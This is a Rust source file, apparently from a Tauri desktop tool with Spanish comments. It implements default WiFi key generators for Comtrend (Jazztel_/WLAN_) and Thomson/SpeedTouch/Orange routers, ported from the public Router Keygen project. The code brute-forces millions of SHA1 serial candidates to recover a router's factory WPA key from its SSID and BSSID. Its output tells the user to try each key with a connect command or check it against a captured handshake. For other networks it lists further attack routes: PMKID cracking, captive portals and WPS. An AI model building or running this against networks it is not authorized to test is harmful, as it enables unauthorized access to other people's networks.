// Keygen de claves por defecto — vía de CONEXIÓN sin RF (lab).
// Algoritmos públicos (Router Keygen, GPLv3):
// - Comtrend (Jazztel_XXXX / WLAN_XXXX): MD5(magic+magia2+XX+ssid4+mac)[0..20], 512 candidatos si OUI 001A2B, 1 candidato en resto.
// - Thomson (ThomsonXXXXXX, Orange-XXXXXX, ...): SHA1("CP"+YY+WW+hex3) con diccionario
//   [A-Z0-9]³ (46656) × años 2004-2012 × semanas 01-52 = 21.840.192 hashes con threads.
//   Sufijo SSID = últimos 3 bytes del digest; clave = primeros 5 bytes (10 hex).
//   Implementación fiel a routerkeygenPC (ThomsonKeygen.cpp + unknown.h, GPLv3).

use tauri::{command, AppHandle};
use crate::commands::CmdResponse;
use sha1::{Digest, Sha1};
use std::sync::atomic::{AtomicBool, Ordering};

// OUIs conocidos para Thomson (fragmentos de SSID que identifican al router).
// Tomados del catálogo RouterKeygenPC; cada entrada es un prefijo de 6 hex que sigue al SSID.
const THOMSON_OUIS: &[&str] = &[
    "Thomson", "SpeedTouch", "Orange-", "Orange_", "Infinitum", "BBox-", "BBox_",
    "DMax", "BigPond", "O2Wireless", "Otenet", "Cyta", "TN_private", "Blink",
];

/// Detección por patrón de SSID. Pura, testeable.
pub fn detect_alg(ssid: &str) -> KeygenAlg {
    let s = ssid.trim();
    if let Some(suf) = s
        .strip_prefix("Jazztel_")
        .or_else(|| s.strip_prefix("JAZZTEL_"))
        .or_else(|| s.strip_prefix("WLAN_"))
    {
        if suf.len() == 4 && suf.chars().all(|c| c.is_ascii_hexdigit()) {
            return KeygenAlg::Comtrend;
        }
    }
    if s.len() > 6 {
        let (head, tail) = s.split_at(s.len() - 6);
        if tail.chars().all(|c| c.is_ascii_hexdigit())
            && THOMSON_OUIS.iter().any(|p| head.eq_ignore_ascii_case(p))
        {
            return KeygenAlg::Thomson;
        }
    }
    KeygenAlg::None
}

/// Limpia el BSSID dejando solo hexadecimales (12 chars).
fn clean_mac(bssid: &str) -> Option<String> {
    let m: String = bssid.chars().filter(|c| c.is_ascii_hexdigit()).collect();
    if m.len() == 12 {
        Some(m.to_uppercase())
    } else {
        None
    }
}

/// MD5 hexadecimal de 20 primeros bytes.
fn md5_hex(data: &[u8]) -> String {
    format!("{:x}", md5::compute(data))
}

/// Algoritmos de keygen detectables.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum KeygenAlg {
    Comtrend,
    Thomson,
    None,
}

/// Comtrend: MD5(magic+"bcgbghgg" + [magia2 + XX|macmod] + ssid4 + mac), 20 primeros hex.
pub fn comtrend_keys(ssid: &str, bssid: &str) -> Result<Vec<String>, String> {
    let mac = clean_mac(bssid).ok_or_else(|| "BSSID inválido (se necesitan 12 hex)".to_string())?;
    let ssid4 = ssid.trim().chars().rev().take(4).collect::<String>().chars().rev().collect::<String>();
    if ssid4.len() != 4 {
        return Err("SSID demasiado corto para Comtrend (sufijo XXXX)".into());
    }
    const MAGIC: &str = "bcgbghgg";
    let mut out = vec![];
    if mac.starts_with("001A2B") {
        for i in 0..512u16 {
            let (magia2, xx) = if i < 256 { ("64680C", format!("{:02X}", i)) } else { ("3872C0", format!("{:02X}", i - 256)) };
            let data = format!("{}{}{}{}{}", MAGIC, magia2, xx, ssid4, mac);
            out.push(md5_hex(data.as_bytes())[..20].to_string());
        }
    } else {
        let macmod = format!("{}{}", &mac[..8], ssid4).to_uppercase();
        let data = format!("{}{}{}", MAGIC, macmod, mac);
        out.push(md5_hex(data.as_bytes())[..20].to_string());
    }
    Ok(out)
}

/// Thomson (Thomson/SpeedTouch/Orange/Infinitum/BBox/...): algoritmo público
/// Router Keygen (GPLv3, Kevin Devine / Rui Araújo / Luís Fonseca).
///
/// S/N (12 ASCII) = "CP" + YY(04-12) + WW(01-52) + 6 hex de 3 bytes del diccionario.
/// SHA1(S/N) → últimos 3 bytes = sufijo de 6 hex del SSID; primeros 5 bytes = clave (10 hex).
/// El diccionario son las 36³=46656 combinaciones de [A-Z0-9]³ en orden base-36.
/// Espacio total: 46656 × 9 años × 52 semanas = 21.840.192 SHA1 (paralelizado con threads).
const THOMSON_ALPHA: &[u8; 36] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
const THOMSON_DIC_SIZE: usize = 36 * 36 * 36;
const THOMSON_YEAR_MIN: u8 = 4;
const THOMSON_YEAR_MAX: u8 = 12;
const THOMSON_WEEK_MAX: u8 = 52;

/// dic[i] → 3 bytes ASCII, contador base-36 big-endian sobre A-Z0-9.
/// Equivale exactamente a la tabla `dic` de unknown.h (routerkeygenPC).
fn thomson_dic_entry(mut i: usize) -> [u8; 3] {
    let mut out = [THOMSON_ALPHA[0]; 3];
    for pos in (0..3).rev() {
        out[pos] = THOMSON_ALPHA[i % 36];
        i /= 36;
    }
    out
}

/// Candidato encontrado: serial que genera el SSID + su clave por defecto.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ThomsonHit {
    pub serial: String,
    pub key: String,
}

/// Comprueba un serial de 12 ASCII contra el sufijo del SSID (3 bytes).
/// Devuelve la clave si el SHA1 encaja, `None` si no.
fn thomson_check(suffix: &[u8; 3], serial12: &[u8; 12]) -> Option<String> {
    let mut hasher = Sha1::new();
    hasher.update(serial12);
    let digest = hasher.finalize();
    if digest[17] == suffix[0] && digest[18] == suffix[1] && digest[19] == suffix[2] {
        Some(format!(
            "{:02X}{:02X}{:02X}{:02X}{:02X}",
            digest[0], digest[1], digest[2], digest[3], digest[4]
        ))
    } else {
        None
    }
}

/// Búsqueda Thomson completa sobre el sufijo de 6 hex del SSID.
/// `years`/`weeks`: rangos inclusivos (por defecto 2004-2012 / 1-52, como Router Keygen).
/// Se detiene al alcanzar `max_keys` (los SSID reales suelen dar 1-3 candidatos).
/// Devuelve (hits ordenados por serial, espacio_total_buscado).
pub fn thomson_search(
    ssid: &str,
    max_keys: usize,
    years: std::ops::RangeInclusive<u8>,
    weeks: std::ops::RangeInclusive<u8>,
) -> Result<(Vec<ThomsonHit>, usize), String> {
    let s = ssid.trim();
    if s.len() < 6 {
        return Err("SSID demasiado corto para Thomson (sufijo de 6 hex)".into());
    }
    let suffix_hex = s[s.len() - 6..].to_uppercase();
    if suffix_hex.len() != 6 || !suffix_hex.chars().all(|c| c.is_ascii_hexdigit()) {
        return Err("El SSID Thomson debe terminar en 6 hex (p. ej. ThomsonF8A3D0)".into());
    }
    let suffix = [
        u8::from_str_radix(&suffix_hex[0..2], 16).unwrap(),
        u8::from_str_radix(&suffix_hex[2..4], 16).unwrap(),
        u8::from_str_radix(&suffix_hex[4..6], 16).unwrap(),
    ];
    let max_keys = max_keys.clamp(1, 50);
    let years: Vec<u8> = years.collect();
    let weeks: Vec<u8> = weeks.collect();
    if years.is_empty() || weeks.is_empty() {
        return Err("Rango de años/semanas vacío".into());
    }
    let space = THOMSON_DIC_SIZE * years.len() * weeks.len();

    let threads = std::thread::available_parallelism()
        .map(|n| n.get())
        .unwrap_or(4)
        .clamp(1, 16);
    let hits = std::sync::Mutex::new(Vec::<ThomsonHit>::new());
    let stop = AtomicBool::new(false);
    // Referencias compartidas (Copy): los threads del scope pueden tomarlas.
    let years_ref = &years;
    let weeks_ref = &weeks;
    let hits_ref = &hits;
    let stop_ref = &stop;
    let suffix_ref = &suffix;

    std::thread::scope(|scope| {
        let chunk = THOMSON_DIC_SIZE.div_ceil(threads);
        for t in 0..threads {
            let start = t * chunk;
            let end = ((t + 1) * chunk).min(THOMSON_DIC_SIZE);
            if start >= end {
                continue;
            }
            let hits = hits_ref;
            let stop = stop_ref;
            let years = years_ref;
            let weeks = weeks_ref;
            let suffix = suffix_ref;
            scope.spawn(move || {
                let mut serial = [0u8; 12];
                serial[0] = b'C';
                serial[1] = b'P';
                for i in start..end {
                    if stop.load(Ordering::Relaxed) {
                        break;
                    }
                    let dic = thomson_dic_entry(i);
                    // "%02X%02X%02X" de los 3 bytes ASCII (idéntico al sprintf original)
                    let hex = format!("{:02X}{:02X}{:02X}", dic[0], dic[1], dic[2]);
                    let hex = hex.as_bytes();
                    serial[6..12].copy_from_slice(hex);
                    for &y in years {
                        serial[2] = b'0' + y / 10;
                        serial[3] = b'0' + y % 10;
                        for &w in weeks {
                            serial[4] = b'0' + w / 10;
                            serial[5] = b'0' + w % 10;
                            if let Some(key) = thomson_check(suffix, &serial) {
                                let mut guard = hits.lock().unwrap();
                                if guard.len() < max_keys
                                    && !guard.iter().any(|h| h.key == key)
                                {
                                    guard.push(ThomsonHit {
                                        serial: String::from_utf8_lossy(&serial).into_owned(),
                                        key,
                                    });
                                    if guard.len() >= max_keys {
                                        stop.store(true, Ordering::Relaxed);
                                    }
                                }
                            }
                        }
                    }
                }
            });
        }
    });

    let mut hits = hits.into_inner().unwrap();
    hits.sort_by(|a, b| a.serial.cmp(&b.serial));
    Ok((hits, space))
}

/// Comando: dice qué algoritmo aplica a un SSID (sin calcular).
#[command]
pub async fn keygen_detect(_app: AppHandle, ssid: String) -> CmdResponse {
    let (msg, ok) = match detect_alg(&ssid) {
        KeygenAlg::Comtrend => (
            format!("{} → Comtrend (Jazztel_/WLAN_). Genera candidatos con keygen_run (necesita BSSID).", ssid.trim()),
            true,
        ),
        KeygenAlg::Thomson => (
            format!("{} → Thomson/familia: algoritmo RouterKeygen real (SHA1 de seriales CP+AÑO+SEMANA+dic, 2004-2012). Búsqueda completa ~21.8M hashes con threads. Genera con keygen_run.", ssid.trim()),
            true,
        ),
        KeygenAlg::None => (
            format!("{} → sin keygen conocido. Vías: PMKID/handshake + crack, portal, WPS.", ssid.trim()),
            false,
        ),
    };
    CmdResponse { success: ok, output: msg, stderr: String::new(), exit_code: Some(ok as i32) }
}

/// Comando: genera candidatos para SSID+BSSID.
/// - Comtrend: cálculo directo (1 o 512 candidatos).
/// - Thomson: búsqueda SHA1 completa años×semanas×diccionario (máx. 5, con threads).
#[command]
pub async fn keygen_run(_app: AppHandle, ssid: String, bssid: String) -> CmdResponse {
    if detect_alg(&ssid) == KeygenAlg::Thomson {
        return thomson_cmd(&ssid, &bssid, 5);
    }
    if detect_alg(&ssid) != KeygenAlg::Comtrend {
        return CmdResponse {
            success: false,
            output: String::new(),
            stderr: "Sin keygen conocido para este SSID.".into(),
            exit_code: None,
        };
    }
    match comtrend_keys(&ssid, &bssid) {
        Ok(keys) => CmdResponse {
            success: true,
            output: format!(
                "Comtrend · {} candidatos para {} ({}):\n{}\n\nPrueba cada uno con wifi_connect o verifícalos contra el handshake.",
                keys.len(), ssid.trim(), bssid.to_uppercase(),
                keys.join("\n")
            ),
            stderr: String::new(),
            exit_code: Some(0),
        },
        Err(e) => CmdResponse { success: false, output: String::new(), stderr: e, exit_code: None },
    }
}

/// Comando: búsqueda Thomson completa con límite configurable (típico 1-10).
/// Años 2004-2012 + semanas 01-52 (idéntico a RouterKeygen). Puede tardar segundos.
#[command]
pub async fn thomson_run(_app: AppHandle, ssid: String, bssid: String, max_keys: usize) -> CmdResponse {
    thomson_cmd(&ssid, &bssid, max_keys)
}

/// Lógica compartida keygen_run/thomson_run (síncrona: CPU con threads propios).
fn thomson_cmd(ssid: &str, bssid: &str, max_keys: usize) -> CmdResponse {
    if detect_alg(ssid) != KeygenAlg::Thomson {
        return CmdResponse {
            success: false,
            output: String::new(),
            stderr: format!("SSID {} no es Thomson. Usa keygen_detect para ver el algoritmo.", ssid),
            exit_code: None,
        };
    }
    let mac = match clean_mac(bssid) {
        Some(m) => m,
        None => {
            return CmdResponse {
                success: false,
                output: String::new(),
                stderr: "BSSID inválido (se necesitan 12 hex)".into(),
                exit_code: None,
            }
        }
    };
    // Routers de nueva generación: el sufijo del BSSID coincide con el del SSID
    // y la probabilidad de acierto es muy baja (aviso honesto de RouterKeygen).
    let ssid_suffix = ssid.trim()[ssid.trim().len() - 6..].to_uppercase();
    let new_gen_warn = if mac.ends_with(&ssid_suffix) {
        "AVISO: el BSSID termina igual que el SSID (nueva generación): probabilidad baja.\n"
    } else {
        ""
    };
    let t0 = std::time::Instant::now();
    let (hits, space) = match thomson_search(
        ssid,
        max_keys,
        THOMSON_YEAR_MIN..=THOMSON_YEAR_MAX,
        1..=THOMSON_WEEK_MAX,
    ) {
        Ok(r) => r,
        Err(e) => {
            return CmdResponse { success: false, output: String::new(), stderr: e, exit_code: None }
        }
    };
    let ms = t0.elapsed().as_millis();
    if hits.is_empty() {
        return CmdResponse {
            success: false,
            output: String::new(),
            stderr: format!(
                "{}Thomson · sin candidatos para {} tras {} hashes en {} ms. \
                O el router es de nueva generación o el SSID no es de fábrica.",
                new_gen_warn, ssid.trim(), space, ms
            ),
            exit_code: Some(1),
        };
    }
    let list = hits
        .iter()
        .map(|h| format!("{}  (S/N {})", h.key, h.serial))
        .collect::<Vec<_>>()
        .join("\n");
    CmdResponse {
        success: true,
        output: format!(
            "{}Thomson · {} candidato(s) para {} ({} hashes en {} ms):\n{}\n\nPrueba cada uno con wifi_connect o verifícalos contra el handshake.",
            new_gen_warn, hits.len(), ssid.trim(), space, ms, list
        ),
        stderr: String::new(),
        exit_code: Some(0),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn detects_patterns() {
        assert_eq!(detect_alg("Jazztel_A1B2"), KeygenAlg::Comtrend);
        assert_eq!(detect_alg("WLAN_00ff"), KeygenAlg::Comtrend);
        assert_eq!(detect_alg("ThomsonA1B2C3"), KeygenAlg::Thomson);
        assert_eq!(detect_alg("Orange-123ABC"), KeygenAlg::Thomson);
        assert_eq!(detect_alg("TP-Link_29D6"), KeygenAlg::None);
        assert_eq!(detect_alg("JazztelTOOLONG"), KeygenAlg::None);
    }

    #[test]
    fn comtrend_shapes() {
        let many = comtrend_keys("WLAN_AB12", "00:1A:2B:11:22:33").unwrap();
        assert_eq!(many.len(), 512);
        assert!(many.iter().all(|k| k.len() == 20 && k.chars().all(|c| c.is_ascii_hexdigit())));
        let one1 = comtrend_keys("Jazztel_A1B2", "48:22:54:88:29:D6").unwrap();
        let one2 = comtrend_keys("Jazztel_A1B2", "48:22:54:88:29:d6").unwrap();
        assert_eq!(one1.len(), 1);
        assert_eq!(one1, one2);
        assert!(comtrend_keys("WLAN_AB12", "corto").is_err());
    }

    #[test]
    fn thomson_dic_order_matches_routerkeygen() {
        // Primeras, frontera base-36 y última entrada de unknown.h
        assert_eq!(thomson_dic_entry(0), *b"AAA");
        assert_eq!(thomson_dic_entry(1), *b"AAB");
        assert_eq!(thomson_dic_entry(35), *b"AA9");
        assert_eq!(thomson_dic_entry(36), *b"ABA");
        assert_eq!(thomson_dic_entry(THOMSON_DIC_SIZE - 1), *b"999");
        assert_eq!(THOMSON_DIC_SIZE, 46656);
    }

    #[test]
    fn thomson_check_known_vector() {
        // Vector público (Kevin Devine): S/N CP0615+"109" → SSID …F8A3D0, clave 742DA831D2
        let suffix = [0xF8, 0xA3, 0xD0];
        assert_eq!(
            thomson_check(&suffix, b"CP0615313039").as_deref(),
            Some("742DA831D2")
        );
        assert_eq!(thomson_check(&suffix, b"CP0615313038"), None);
    }

    #[test]
    fn thomson_search_finds_known_key_in_bounded_range() {
        // Búsqueda acotada a año 06 / semana 15: debe hallar el vector conocido.
        let (hits, space) = thomson_search("SpeedTouchF8A3D0", 5, 6..=6, 15..=15).unwrap();
        assert_eq!(space, 46656);
        assert!(hits.iter().any(|h| h.key == "742DA831D2" && h.serial == "CP0615313039"));
    }
}